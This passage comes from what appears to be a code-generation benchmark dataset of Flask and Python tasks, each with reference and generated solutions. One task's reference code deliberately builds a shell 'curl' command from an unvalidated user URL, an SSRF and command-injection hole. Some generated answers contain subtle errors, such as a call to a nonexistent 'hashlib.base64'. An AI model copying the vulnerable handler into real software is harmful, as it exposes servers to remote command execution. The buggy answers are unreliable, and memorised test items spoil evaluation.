nameservers=NAMESERVERS)\n        except Exception as err:\n            return jsonify({'message': 'Invalid domain name'}), 400\n        else:\n            session.scan()\n            self.sessions.append(session)\n        return jsonify(session.status()), 201\n\n    def api_status(self, sid):\n        for s in self.sessions:\n            if s.id == sid:\n                return jsonify(s.status())\n        return jsonify({'message': 'Scan session not found'}), 404\n\n    def api_domains(self, sid):\n        for s in self.sessions:\n            if s.id == sid:\n                return jsonify(s.domains())\n        return jsonify({'message': 'Scan session not found'}), 404\n\n    def api_csv(self, sid):\n        for s in self.sessions:\n            if s.id == sid:\n                return s.csv(), 200, {'Content-Type': 'text/csv', 'Content-Disposition': 'attachment; filename=dnstwist.csv'}\n        return jsonify({'message': 'Scan session not found'}), 404\n\n    def api_json(self, sid):\n        for s in self.sessions:\n            if s.id == sid:\n                return s.json(), 200, {'Content-Type': 'application/json', 'Content-Disposition': 'attachment; filename=dnstwist.json'}\n        return jsonify({'message': 'Scan session not found'}), 404\n\n    def api_list(self, sid):\n        for s in self.sessions:\n            if s.id == sid:\n                return s.list(), 200, {'Content-Type': 'text/plain', 'Content-Disposition': 'attachment; filename=dnstwist.txt'}\n        return jsonify({'message': 'Scan session not found'}), 404\n\n    def api_stop(self, sid):\n        for s in self.sessions:\n            if s.id == sid:\n                s.stop()\n                return jsonify({})\n        return jsonify({'message': 'Scan session not found'}), 404\n\n    def run(self, host=HOST, port=PORT):\n        self.app.run(host=host, port=port)",
    "Code_level": "Class-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, jsonify, Response, send_file\nimport dnstwist\nimport threading\nimport time\nimport csv\nimport json\nimport os\nimport uuid\nimport tempfile\n\nclass DNSTwistAPI:\n    def __init__(self):\n        self.app = Flask(__name__)\n        self.sessions = []\n        self._setup_routes()\n        self._start_janitor()\n\n    def _setup_routes(self):\n        @self.app.route('/')\n        def root():\n            return \"DNSTwist API - Use /api/scan to start a scan\"\n\n        @self.app.route('/api/scan', methods=['POST'])\n        def api_scan():\n            data = request.get_json()\n            domain = data.get('domain')\n            if not domain:\n                return jsonify({'error': 'Missing domain'}), 400\n\n            sid = str(uuid.uuid4())\n            session = {\n                'sid': sid,\n                'domain': domain,\n                'status': 'running',\n                'start_time': time.time(),\n                'results': None\n            }\n            self.sessions.append(session)\n\n            threading.Thread(target=self.run_scan, args=(session,)).start()\n\n            return jsonify({'sid': sid}), 202\n\n        @self.app.route('/api/status/<sid>', methods=['GET'])\n        def api_status(sid):\n            session = next((s for s in self.sessions if s['sid'] == sid), None)\n            if not session:\n                return jsonify({'error': 'Session not found'}), 404\n\n            return jsonify({\n                'sid': sid,\n                'status': session['status'],\n                'domain': session['domain'],\n                'elapsed': time.time() - session['start_time']\n            })\n\n        @self.app.route('/api/domains/<sid>', methods=['GET'])\n        def api_domains(sid):\n            session = next((s for s in self.sessions if s['sid'] == sid), None)\n            if not session:\n                return jsonify({'error': 'Session not found'}), 404\n            if session['status'] != 'complete':\n                return jsonify({'error': 'Scan not completed yet'}), 400\n\n            return jsonify(session['results'])\n\n        @self.app.route('/api/csv/<sid>', methods=['GET'])\n        def api_csv(sid):\n            session = next((s for s in self.sessions if s['sid'] == sid), None)\n            if not session:\n                return jsonify({'error': 'Session not found'}), 404\n            if session['status'] != 'complete':\n                return jsonify({'error': 'Scan not completed yet'}), 400\n\n            si = tempfile.TemporaryFile(mode='w+', newline='')\n            cw = csv.DictWriter(si, fieldnames=session['results'][0].keys())\n            cw.writeheader()\n            cw.writerows(session['results'])\n            si.seek(0)\n\n            return send_file(si, mimetype='text/csv', as_attachment=True, download_name=f'{session[\"domain\"]}_results.csv')\n\n        @self.app.route('/api/json/<sid>', methods=['GET'])\n        def api_json(sid):\n            session = next((s for s in self.sessions if s['sid'] == sid), None)\n            if not session:\n                return jsonify({'error': 'Session not found'}), 404\n            if session['status'] != 'complete':\n                return jsonify({'error': 'Scan not completed yet'}), 400\n\n            return Response(json.dumps(session['results']), mimetype='application/json')\n\n        @self.app.route('/api/list/<sid>', methods=['GET'])\n        def api_list(sid):\n            session = next((s for s in self.sessions if s['sid'] == sid), None)\n            if not session:\n                return jsonify({'error': 'Session not found'}), 404\n            if session['status'] != 'complete':\n                return jsonify({'error': 'Scan not completed yet'}), 400\n\n            domains = [r['domain-name'] for r in session['results']]\n            return Response('\\n'.join(domains), mimetype='text/plain')\n\n        @self.app.route('/api/stop/<sid>', methods=['POST'])\n        def api_stop(sid):\n            session = next((s for s in self.sessions if s['sid'] == sid), None)\n            if not session:\n                return jsonify({'error': 'Session not found'}), 404\n\n            session['status'] = 'stopped'\n            return jsonify({'message': 'Session stopped'})\n\n    def _start_janitor(self):\n        thread = threading.Thread(target=self.janitor, daemon=True)\n        thread.start()\n\n    def janitor(self):\n        while True:\n            current_time = time.time()\n            for session in list(self.sessions):\n                if session['status'] in ['complete', 'stopped']:\n                    if current_time - session['start_time'] > 86400:  # 24 hours\n                        self.sessions.remove(session)\n            time.sleep(3600)  # Run cleanup every hour\n\n    def run(self, host='0.0.0.0', port=5000):\n        self.app.run(host=host, port=port)\n\n    def run_scan(self, session):\n        try:\n            scanner = dnstwist.DomainFuzz(session['domain'])\n            scanner.generate()\n            results = []\n\n            for domain in scanner.domains:\n                result = {'domain-name': domain['domain-name']}\n                try:\n                    info = dnstwist.DnsRequest(domain['domain-name'])\n                    result.update({\n                        'a': info.a(),\n                        'aaaa': info.aaaa(),\n                        'mx': info.mx(),\n                        'ns': info.ns()\n                    })\n                except Exception as e:\n                    result['error'] = str(e)\n                results.append(result)\n\n            session['results'] = results\n            session['status'] = 'complete'\n        except Exception as e:\n            session['status'] = 'error'\n            session['error'] = str(e)"
  },
  {
    "Task_id": 193,
    "Instruction": "Task Description: Create a Flask-based web application that handles file uploads, processes the uploaded file to generate predictions, and displays the results.\n\nFunction Description: The application consists of two main routes: one for displaying the upload form and another for handling file uploads and processing. The first route renders the homepage with an upload form, while the second route handles POST requests, saves uploaded files securely, processes them to get predictions, and flashes the results to the user.\n\nInput:\n- For index() function: None (handles GET requests to root URL)\n- For submit_file() function: \n  - request.files: A dictionary-like object containing uploaded files (expects a 'file' key)\n  - request.url: The URL from which the request originated (used for redirects)\n\nOutput:\n- For index() function: Rendered HTML template ('index.html')\n- For submit_file() function: \n  - Redirects to root URL after processing\n  - Flashes messages containing:\n    - The prediction result (label)\n    - The full path of the saved file\n  - Error messages if no file is provided or selected\n\nNote: The functions interact with the following external components:\n- A prediction function (getPrediction) that takes a filename and returns a label\n- Flask's flash system for displaying messages\n- File system operations for saving uploaded files\n- Security utilities for sanitizing filenames",
    "Canonical_solution": "from flask import Flask, render_template, request, redirect, flash\nfrom werkzeug.utils import secure_filename\nfrom main import getPrediction\nimport os\n\nUPLOAD_FOLDER = 'static/images/'\napp = Flask(__name__, static_folder=\"static\")\napp.secret_key = \"secret key\"\napp.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER\n\n@app.route('/')\ndef index():\n    return render_template('index.html')\n\n@app.route('/', methods=['POST'])\ndef submit_file():\n    if request.method == 'POST':\n        if 'file' not in request.files:\n            flash('No file part')\n            return redirect(request.url)\n        file = request.files['file']\n        if file.filename == '':\n            flash('No file selected for uploading')\n            return redirect(request.url)\n        if file:\n            filename = secure_filename(file.filename)\n            file.save(os.path.join(app.config['UPLOAD_FOLDER'],filename))\n            label = getPrediction(filename)\n            flash(label)\n            full_filename = os.path.join(app.config['UPLOAD_FOLDER'], filename)\n            flash(full_filename)\n            return redirect('/')",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, render_template, request, redirect, url_for, flash\nfrom werkzeug.utils import secure_filename\nimport os\n\napp = Flask(__name__)\napp.secret_key = 'your_secret_key'\nUPLOAD_FOLDER = 'uploads'\napp.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER\n\ndef getPrediction(filename):\n    return \"SampleLabel\"\n\n@app.route('/')\ndef index():\n    return render_template('index.html')\n\n@app.route('/', methods=['POST'])\ndef submit_file():\n    if 'file' not in request.files:\n        flash('No file part')\n        return redirect(request.url)\n    file = request.files['file']\n    if file.filename == '':\n        flash('No file selected')\n        return redirect(request.url)\n    if file:\n        filename = secure_filename(file.filename)\n        file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))\n        label = getPrediction(filename)\n        flash(f'Prediction: {label}')\n        flash(f'File saved at: {os.path.join(app.config[\"UPLOAD_FOLDER\"], filename)}')\n        return redirect(url_for('index'))\n\nif __name__ == '__main__':\n    os.makedirs(UPLOAD_FOLDER, exist_ok=True)\n    app.run(debug=True)"
  },
  {
    "Task_id": 194,
    "Instruction": "Task Description: Create a Flask web application that serves as a code beautifier service. The application should take a directory path as input, and for each request with a specific slug, it should locate the corresponding text file in the directory, apply syntax highlighting, and return the formatted HTML.\n\nFunction Description: The `beautify` function is a Flask route handler that processes HTTP GET requests with a slug parameter. It checks if the slug is valid, locates the corresponding text file in the specified directory, reads the file content, applies syntax highlighting using Pygments, and returns the formatted HTML. If the slug is invalid or the file is not found, it returns a 404 error.\n\nInput: \n- `slug` (str): A URL path segment representing the name of the directory containing the text file to be beautified.\n\nOutput: \n- If successful: Returns HTML with syntax-highlighted code.\n- If unsuccessful: Returns a 404 error response.",
    "Canonical_solution": "from flask import Flask, abort, redirect\napp = Flask(__name__)\n\nimport argparse, os, pygments\nfrom pygments import highlight\nfrom pygments.lexers import guess_lexer\nfrom pygments.formatters import HtmlFormatter\n\nparser = argparse.ArgumentParser()\nparser.add_argument(\"root_dir\", help=\"Path to directory with pastes\")\nargs = parser.parse_args()\n\n@app.route('/<slug>')\ndef beautify(slug):\n    if len(slug) > 64:\n        abort(404)\n\n    target_dir = os.path.join(args.root_dir, slug)\n\n    if not target_dir.startswith(args.root_dir):\n        abort(404)\n\n    if os.path.isdir(target_dir):\n        target_file = os.path.join(target_dir, \"index.txt\")\n        \n        with open(target_file) as f:\n            code = f.read()\n            lexer = guess_lexer(code)\n            formatter = HtmlFormatter(linenos=True, full=True)\n            return highlight(code, lexer, formatter)\n\n    abort(404)",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, abort\nimport os\nfrom pygments import highlight\nfrom pygments.lexers import get_lexer_by_name\nfrom pygments.formatters import HtmlFormatter\n\napp = Flask(__name__)\n\n# Directory containing code files\nCODE_DIRECTORY = \"/path/to/code/files\"\n\n@app.route('/beautify/<slug>')\ndef beautify(slug):\n    # Validate slug (simple example: check if it's alphanumeric)\n    if not slug.isalnum():\n        abort(404)\n\n    file_path = os.path.join(CODE_DIRECTORY, slug, f\"{slug}.txt\")\n    \n    if not os.path.isfile(file_path):\n        abort(404)\n\n    try:\n        with open(file_path, 'r') as file:\n            code = file.read()\n\n        lexer = get_lexer_by_name(\"python\", stripall=True)\n        formatter = HtmlFormatter(linenos=True, cssclass=\"code\")\n        highlighted_code = highlight(code, lexer, formatter)\n\n        html_output = f\"\"\"\n        <!DOCTYPE html>\n        <html>\n        <head>\n            <title>Beautified Code</title>\n            <style>{HtmlFormatter().get_style_defs('.code')}</style>\n        </head>\n        <body>\n            <div class=\"code\">{highlighted_code}</div>\n        </body>\n        </html>\n        \"\"\"\n        return html_output\n\n    except Exception as e:\n        abort(404)"
  },
  {
    "Task_id": 195,
    "Instruction": "Task Description: Create a Flask-based HTTP server endpoint that processes incoming POST requests containing a URL, executes a curl command to fetch the URL's content, and returns the fetched content as the response.\n\nFunction Description: The function handles Server-Side Request Forgery (SSRF) vulnerability demonstration by accepting a URL via POST request, executing it through system curl command, and returning the response. This is for educational purposes only to demonstrate SSRF risks.\n\nInput: \n- HTTP POST request with form data containing a 'url' parameter (string) representing the target URL to fetch\n\nOutput:\n- Raw content (bytes) obtained from the curl command execution against the provided URL, returned as the HTTP response\n\nNote: The reference code shows a security anti-pattern (unsafe SSRF) and should only be used in controlled environments for educational purposes. In production, such functionality would require strict input validation and security controls.",
    "Canonical_solution": "from flask import Flask, request \nimport subprocess\n\napp = Flask(__name__)\n\ndef command(cmd):\n    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)\n    (out, err) = proc.communicate()\n    return out\n\n@app.route(\"/ssrf\", methods=['POST'])\ndef ssrf():\n    data = request.values\n    content = command(f\"curl {data.get('url')}\")\n    return content",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request\nimport subprocess\n\napp = Flask(__name__)\n\n@app.route('/fetch', methods=['POST'])\ndef fetch_url():\n    url = request.form.get('url')\n    if not url:\n        return 'Missing URL parameter', 400\n    \n    try:\n        result = subprocess.check_output(['curl', '-s', url], stderr=subprocess.STDOUT)\n        return result\n    except subprocess.CalledProcessError as e:\n        return e.output, 500\n\nif __name__ == '__main__':\n    app.run(debug=True)"
  },
  {
    "Task_id": 196,
    "Instruction": "Task Description: Create a Flask webhook callback handler that processes incoming POST requests, verifies signatures, and logs request data.\n\nFunction Description: The callback function handles incoming POST requests to the '/callback' endpoint. It extracts the signature from headers, logs the request body, attempts to process the webhook data, and returns a response. It handles API exceptions and invalid signatures appropriately.\n\nInput: \n- HTTP POST request containing:\n  - Headers: 'X-Line-Signature' (string) - The signature for request verification\n  - Body: (string) - The payload data sent with the request\n\nOutput: \n- Returns 'OK' (string) if successful\n- Returns HTTP 400 error if signature is invalid\n- Logs request information and any exceptions that occur",
    "Canonical_solution": "import os\nimport logging\nfrom flask import Flask, request, abort\nfrom werkzeug.middleware.proxy_fix import ProxyFix\n\napp = Flask(__name__)\napp.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_host=1, x_proto=1)\nlogging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')\napp.logger.setLevel(logging.INFO)\n\n@app.route(\"/callback\", methods=['POST'])\ndef callback():\n    # get X-Line-Signature header value\n    signature = request.headers['X-Line-Signature']\n\n    # get request body as text\n    body = request.get_data(as_text=True)\n    app.logger.info(\"Request body: \" + body)\n\n    # handle webhook body\n    try:\n        handler.handle(body, signature)\n    except ApiException as e:\n        app.logger.warn(\"Got exception from LINE Messaging API: %s\\n\" % e.body)\n    except InvalidSignatureError:\n        abort(400)\n\n    return 'OK'",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, abort\nimport os\nimport json\nimport logging\nimport hmac\nimport hashlib\n\napp = Flask(__name__)\n\n# Set up basic logging\nlogging.basicConfig(level=logging.INFO)\n\n# Dummy secret key - in production, use proper secret management\nCHANNEL_SECRET = os.getenv('LINE_CHANNEL_SECRET', 'your-default-secret')\n\ndef validate_signature(body: str, signature: str) -> bool:\n    \"\"\"\n    Validate the request signature using HMAC-SHA256\n    \"\"\"\n    hash_signature = hmac.new(\n        CHANNEL_SECRET.encode('utf-8'),\n        body.encode('utf-8'),\n        hashlib.sha256\n    ).digest()\n    \n    expected_signature = hashlib.base64.b64encode(hash_signature).decode()\n    return hmac.compare_digest(expected_signature, signature)\n\n@app.route('/callback', methods=['POST'])\ndef callback():\n    # Extract signature from headers\n    signature = request.headers.get('X-Line-Signature')\n    if not signature:\n        logging.warning(\"Missing X-Line-Signature header\")\n        abort(400)\n    \n    # Get raw body as string for signature verification\n    body = request.get_data(as_text=True)\n    \n    # Log incoming request\n    logging.info(f\"Received request with signature: {signature}\")\n    logging.debug(f\"Request body: {body}\")\n    \n    # Verify signature\n    if not validate_signature(body, signature):\n        logging.error(\"Invalid signature detected\")\n        abort(400)\n    \n    try:\n        # Process webhook data\n        json_data = json.loads(body)\n        logging.info(f\"Parsed JSON data: {json_data}\")\n        \n        # Add your webhook processing logic here\n        # process_webhook(json_data)\n        \n        return 'OK'\n    \n    except json.JSONDecodeError as e:\n        logging.error(f\"JSON decode error: {str(e)}\")\n        abort(400)\n    except Exception as e:\n        logging.exception(\"Unexpected error during processing\")\n        abort(500)\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=5000)"
  },
  {
    "Task_id": 197,
    "Instruction": "Task Description: Create a Flask-based HTTP server endpoint that handles incoming POST requests with different content types (JSON, CSV, plain text) and returns predictions in the appropriate format.\n\nFunction Description: The function serves as an endpoint ('/invocations') that processes incoming data, makes predictions using a scoring service, and returns the results formatted according to the input content type. It handles three content types: JSON (for single predictions), CSV and plain text (for batch predictions).\n\nInput:\n- HTTP POST request with one of the following content types:\n  1. application/json: Contains JSON data with a \"text\" field and optional \"bing_key\"\n  2. text/csv: Contains CSV data with a \"text\" column\n  3. text/plain: Contains plain text with one text entry per line\n\nOutput:\n- For JSON input: Returns JSON response with top 10 predictions (HTTP 200)\n- For CSV/plain text input: Returns CSV response with predictions (HTTP 200)\n- For unsupported content types: Returns error message (HTTP 415)\n- All responses include appropriate mimetype headers",
    "Canonical_solution": "import os\nimport json\nimport flask\nimport pandas as pd\nimport io\nfrom collections import OrderedDict\n\nprefix = \"/opt/ml/\"\nPATH = os.path.join(prefix, \"model\")\n\napp = flask.Flask(__name__)\n\n@app.route(\"/invocations\", methods=[\"POST\"])\ndef transformation():\n    data = None\n    text = None\n\n    if flask.request.content_type == \"application/json\":\n        data = flask.request.get_json(silent=True)\n        text = data[\"text\"]\n        try:\n            bing_key = data[\"bing_key\"]\n        except Exception:\n            bing_key = None\n\n        predictions = ScoringService.predict(text, bing_key)\n        result = json.dumps(predictions[:10])\n        return flask.Response(response=result, status=200, mimetype=\"application/json\")\n\n    elif flask.request.content_type == \"text/csv\":\n        data = flask.request.data.decode(\"utf-8\")\n        df = pd.read_csv(io.StringIO(data), header=\"infer\")\n        predictions = ScoringService.predict_batch(list(df[\"text\"].values))\n\n        out = io.StringIO()\n        pd.DataFrame(predictions).to_csv(out, index=False)\n        result = out.getvalue()\n        return flask.Response(response=result, status=200, mimetype=\"text/csv\")\n\n    elif flask.request.content_type == \"text/plain\":\n        data = flask.request.data.decode(\"utf-8\")\n        s = io.StringIO(data)\n        texts = []\n        for line in s:\n            texts.append(line)\n        predictions = ScoringService.predict_batch(texts)\n        out = io.StringIO()\n        pd.DataFrame(predictions).to_csv(out, index=False)\n        result = out.getvalue()\n        return flask.Response(response=result, status=200, mimetype=\"text/csv\")\n\n    else:\n        return flask.Response(\n            response=\"This predictor only supports JSON, txt or CSV data\",\n            status=415,\n            mimetype=\"text/plain\",\n        )",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "import flask\nimport json\nimport csv\nfrom io import StringIO\n\napp = flask.Flask(__name__)\n\nclass ScoringService:\n    @staticmethod\n    def predict(data):\n        return [{\"label\": \"example_label\", \"score\": 0.95}]\n\n@app.route('/invocations', methods=['POST'])\ndef predict():\n    content_type = flask.request.headers.get('Content-Type')\n    data = None\n    predictions = []\n\n    if content_type == 'application/json':\n        json_data = flask.request.get_json()\n        text = json_data.get('text')\n        bing_key = json_data.get('bing_key', None)\n        predictions = ScoringService.predict(text)\n        return flask.Response(json.dumps(predictions[:10]), mimetype='application/json')\n\n    elif content_type == 'text/csv':\n        csv_file = flask.request.files.get('file')\n        if not csv_file:\n            return flask.Response(json.dumps({\"error\": \"No CSV file provided\"}), status=400, mimetype='application/json')\n        csv_reader = csv.DictReader(StringIO(csv_file.read().decode('utf-8')))\n        for row in csv_reader:\n            text = row.get('text')\n            if text:\n                predictions.append(ScoringService.predict(text))\n        output = StringIO()\n        csv_writer = csv.writer(output)\n        csv_writer.writerow(['prediction'])\n        for pred in predictions:\n            csv_writer.writerow([json.dumps(pred)])\n        return flask.Response(output.getvalue(), mimetype='text/csv')\n\n    elif content_type == 'text/plain':\n        lines = flask.request.data.decode('utf-8').splitlines()\n        for line in lines:\n            if line.strip():\n                predictions.append(ScoringService.predict(line.strip()))\n        output = StringIO()\n        csv_writer = csv.writer(output)\n        csv_writer.writerow(['prediction'])\n        for pred in predictions:\n            csv_writer.writerow([json.dumps(pred)])\n        return flask.Response(output.getvalue(), mimetype='text/csv')\n\n    else:\n        return flask.Response(json.dumps({\"error\": \"Unsupported Content-Type\"}), status=415, mimetype='application/json')"
  },
  {
    "Task_id": 198,
    "Instruction": "Task Description: Create a Flask-based HTTP server function that acts as a Natural Language Generation (NLG) endpoint, validating incoming requests against a JSON schema and returning appropriate responses.\n\nFunction Description: The function `nlg_app` creates and configures a Flask application that serves as an NLG endpoint. It validates incoming POST requests against a predefined JSON schema (nlg_request_format_spec) and returns different text responses based on the template specified in the request. The server responds with \"Hey there!\" for the \"utter_greet\" template and a default message for all other templates.\n\nInput: \n- base_url: str (optional, default=\"/\") - The base URL path where the NLG endpoint will be mounted\n\nOutput:\n- Flask application object configured with:\n  - A single POST endpoint at the specified base_url\n  - Request validation using jsonschema\n  - Conditional response generation based on the request content",
    "Canonical_solution": "import uuid\nimport jsonschema\nfrom flask import Flask, request, jsonify\nfrom rasa.core.nlg.callback import nlg_request_format_spec\n\ndef nlg_app(base_url=\"/\"):\n    app = Flask(__name__)\n\n    @app.route(base_url, methods=['POST'])\n    def generate():\n        \"\"\"Simple HTTP NLG generator, checks that the incoming request\n        is format according to the spec.\"\"\"\n\n        nlg_call = request.json\n\n        jsonschema.validate(nlg_call, nlg_request_format_spec())\n\n        if nlg_call.get(\"template\") == \"utter_greet\":\n            response = {\"text\": \"Hey there!\"}\n        else:\n            response = {\"text\": \"Sorry, didn't get that.\"}\n        return jsonify(response)\n\n    return app",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, jsonify\nfrom jsonschema import validate, ValidationError\nimport json\n\ndef nlg_app(base_url=\"/\"):\n    app = Flask(__name__)\n\n    nlg_request_format_spec = {\n        \"type\": \"object\",\n        \"properties\": {\n            \"template\": {\"type\": \"string\"},\n            \"context\": {\"type\": \"object\", \"properties\": {}, \"additionalProperties\": True}\n        },\n        \"required\": [\"template\"]\n    }\n\n    @app.route(base_url, methods=[\"POST\"])\n    def handle_nlg():\n        try:\n            data = request.get_json()\n            validate(instance=data, schema=nlg_request_format_spec)\n            \n            template = data.get(\"template\")\n            if template == \"utter_greet\":\n                return jsonify({\"text\": \"Hey there!\"})\n            else:\n                return jsonify({\"text\": \"This is a default message.\"})\n                \n        except ValidationError as ve:\n            return jsonify({\"error\": \"Invalid request format\", \"message\": str(ve)}), 400\n        except Exception as e:\n            return jsonify({\"error\": \"Internal server error\", \"message\": str(e)}), 500\n\n    return app"
  },
  {
    "Task_id": 2,
    "Instruction": "Task Description: Create an asynchronous function that consumes messages from a Kafka topic, processes them in batches, and handles the results using a provided callback function. The function should handle connection retries and gracefully manage the consumer lifecycle.\n\nFunction Description: The function `async_process_streaming_output` asynchronously consumes messages from a specified Kafka topic, processes them in configurable batch sizes, and passes the processed data to a result handler function. It includes retry logic for topic availability and proper consumer startup/shutdown management.\n\nInput:\n- `input_done`: asyncio.Event - Event flag to signal when message consumption should stop\n- `output_topic_name`: str - Name of the Kafka topic to consume messages from\n- `result_handler`: Callable - Function to handle processed message batches\n- `batch_size`: int - Maximum number of records to fetch in each batch\n- `kafka_bootstrap_servers`: str - Comma-separated list of Kafka bootstrap servers\n- `kafka_output_consumer_timeout_ms`: int - Timeout in milliseconds for consumer operations\n\nOutput: None (The function runs continuously until the input_done event is set, processing messages through the result_handler callback)",
    "Canonical_solution": "import asyncio\nimport json\nimport time\nimport traceback\nfrom aiokafka import AIOKafkaConsumer\nfrom aiokafka.errors import UnknownTopicOrPartitionError\n\nasync def async_process_streaming_output(\n    input_done: asyncio.Event,\n    output_topic_name,\n    result_handler,\n    batch_size: int,\n    kafka_bootstrap_servers: str,\n    kafka_output_consumer_timeout_ms: int\n):\n    timeout_ms = kafka_output_consumer_timeout_ms\n\n    # Retry to workaround race condition of topic creation\n    retries = 5\n    while retries > 0:\n        try:\n            consumer = AIOKafkaConsumer(\n                output_topic_name,\n                bootstrap_servers=kafka_bootstrap_servers,\n                value_deserializer=lambda v: json.loads(v.decode(\"utf-8\")),\n                auto_offset_reset=\"earliest\",\n                max_partition_fetch_bytes=3000000,\n            )\n            await consumer.start()\n            break\n        except UnknownTopicOrPartitionError as e:\n            await consumer.stop()\n            retries -= 1\n            time.sleep(1)\n\n    try:\n        while not input_done.is_set():\n            data = await consumer.getmany(timeout_ms=timeout_ms, max_records=batch_size)\n            for topic_partition, messages in data.items():\n                topic = topic_partition.topic\n                if messages:\n                    batches = [msg.value for msg in messages]\n                    for records in batches:\n                        result_handler(records)\n    finally:\n        await consumer.stop()",
    "Code_level": "Function-level",
    "FSMID_for_test": 80,
    "right_result": "import asyncio\nfrom aiokafka import AIOKafkaConsumer\nimport logging\n\nlogger = logging.getLogger(__name__)\n\nasync def async_process_streaming_output(\n    input_done: asyncio.Event,\n    output_topic_name: str,\n    result_handler: callable,\n    batch_size: int,\n    kafka_bootstrap_servers: str,\n    kafka_output_consumer_timeout_ms: int\n):\n    consumer = None\n    retry_attempts = 5\n    retry_delay = 5\n\n    for attempt in range(retry_attempts):\n        try:\n            consumer = AIOKafkaConsumer(\n                output_topic_name,\n                bootstrap_servers=kafka_bootstrap_servers,\n                enable_auto_commit=False,\n                auto_offset_reset='earliest',\n                consumer_timeout_ms=kafka_output_consumer_timeout_ms\n            )\n            await consumer.start()\n            logger.info(\"Kafka consumer started successfully.\")\n            break\n        except Exception as e:\n            logger.error(f\"Failed to connect to Kafka (attempt {attempt + 1}/{retry_attempts}): {e}\")\n            if attempt < retry_attempts - 1:\n                await asyncio.sleep(retry_delay)\n            else:\n                raise\n\n    try:\n        while not input_done.is_set():\n            batch = []\n            try:\n                async for msg in consumer:\n                    batch.append(msg.value)\n                    if len(batch) >= batch_size:\n                        break\n\n                if batch:\n                    await result_handler(batch)\n            except Exception as e:\n                logger.error(f\"Error processing message batch: {e}\")\n\n    finally:\n        if consumer:\n            await consumer.stop()\n            logger.info(\"Kafka consumer stopped gracefully.\")"
  },
  {
    "Task_id": 20,
    "Instruction": "Task Description: Create a Python function that performs HTTP requests using the http.client library, supporting both HTTP and HTTPS protocols, with optional proxy configuration and proper error handling.\n\nFunction Description: The function performs HTTP requests (GET/POST) to a specified endpoint with given parameters. It handles connection setup (with or without proxy), request sending, response processing, and connection cleanup. It supports both Python 2 and 3 compatibility and includes logging for debugging purposes.\n\nInput:\n- method: [str] - HTTP method to use ('GET' or 'POST')\n- action: [str] - URL path/endpoint to request\n- param: [dict] - Optional dictionary of parameters (default: None)\n- **params: [dict] - Additional parameters as keyword arguments\n\nOutput:\n- Returns: [str] - Response body as string if successful (status code 2xx)\n- Raises: [Exception] - If HTTP status code indicates failure (non-2xx)",
    "Canonical_solution": "from json import loads as jsondecode\nfrom logging import debug, info, warning\ntry:\n    # python 2\n    from httplib import HTTPSConnection, HTTPConnection\n    from urlparse import urlparse, parse_qsl\n    from urllib import urlencode\nexcept ImportError:\n    # python 3\n    from http.client import HTTPSConnection, HTTPConnection\n    from urllib.parse import urlencode, urlparse, parse_qsl\n\nclass Config:\n    ID = None\n    TOKEN = None\n    PROXY = None\n    TTL = None\n\ndef request(method, action, param=None, **params):\n    if param:\n        params.update(param)\n\n    URLObj = urlparse(Config.ID)\n    params = dict((k, params[k]) for k in params if params[k] is not None)\n    info(\"%s/%s : %s\", URLObj.netloc, action, params)\n\n    if Config.PROXY:\n        if URLObj.netloc == \"http\":\n            conn = HTTPConnection(Config.PROXY)\n        else:\n            conn = HTTPSConnection(Config.PROXY)\n        conn.set_tunnel(URLObj.netloc, URLObj.port)\n    else:\n        if URLObj.netloc == \"http\":\n            conn = HTTPConnection(URLObj.netloc, URLObj.port)\n        else:\n            conn = HTTPSConnection(URLObj.netloc, URLObj.port)\n\n    headers = {}\n\n    if method == \"GET\":\n        if params:\n            action += '?' + urlencode(params)\n        params = \"\"\n    else:\n        headers[\"Content-Type\"] = \"application/x-www-form-urlencoded\"\n\n    params = urlencode(params)\n\n    conn.request(method, action, params, headers)\n    response = conn.getresponse()\n    res = response.read().decode('utf8')\n    conn.close()\n    if response.status < 200 or response.status >= 300:\n        warning('%s : error[%d]:%s', action, response.status, res)\n        raise Exception(res)\n    else:\n        debug('%s : result:%s', action, res)\n        return res",
    "Code_level": "Function-level",
    "FSMID_for_test": 56,
    "right_result": "import http.client\nimport urllib.parse\nimport os\nimport sys\nimport logging\n\n# Configure logging\nlogging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')\n\ndef make_http_request(method, action, param=None, **params):\n    if param is None:\n        param = {}\n    param.update(params)\n\n    parsed_url = urllib.parse.urlparse(action)\n    scheme = parsed_url.scheme\n    netloc = parsed_url.netloc\n    path = parsed_url.path or '/'\n\n    # Handle query parameters\n    if parsed_url.query:\n        existing_query = urllib.parse.parse_qs(parsed_url.query)\n        for k, v in existing_query.items():\n            if k not in param:\n                param[k] = v[0] if len(v) == 1 else v\n\n    # Check for proxy environment variables\n    proxy_host = os.environ.get('PROXY_HOST')\n    proxy_port = os.environ.get('PROXY_PORT', '8080') if proxy_host else None\n\n    headers = {\n        \"User-Agent\": \"PythonScript/1.0\",\n        \"Content-Type\": \"application/x-www-form-urlencoded\"\n    }\n\n    if scheme == 'https':\n        if proxy_host:\n            conn = http.client.HTTPSConnection(proxy_host, int(proxy_port))\n            conn.set_tunnel(netloc, headers=headers)\n        else:\n            conn = http.client.HTTPSConnection(netloc)\n    else:\n        if proxy_host:\n            conn = http.client.HTTPConnection(proxy_host, int(proxy_port))\n            conn.set_tunnel(netloc, headers=headers)\n        else:\n            conn = http.client.HTTPConnection(netloc)\n\n    try:\n        body = None\n        if method.upper() == 'POST' and param:\n            body = urllib.parse.urlencode(param)\n            headers['Content-Length'] = str(len(body))\n        else:\n            if param:\n                path += '?' + urllib.parse.urlencode(param)\n            headers['Content-Length'] = '0'\n\n        logging.debug(\"Sending %s request to: %s://%s%s\", method, scheme, netloc, path)\n        conn.request(method.upper(), path, 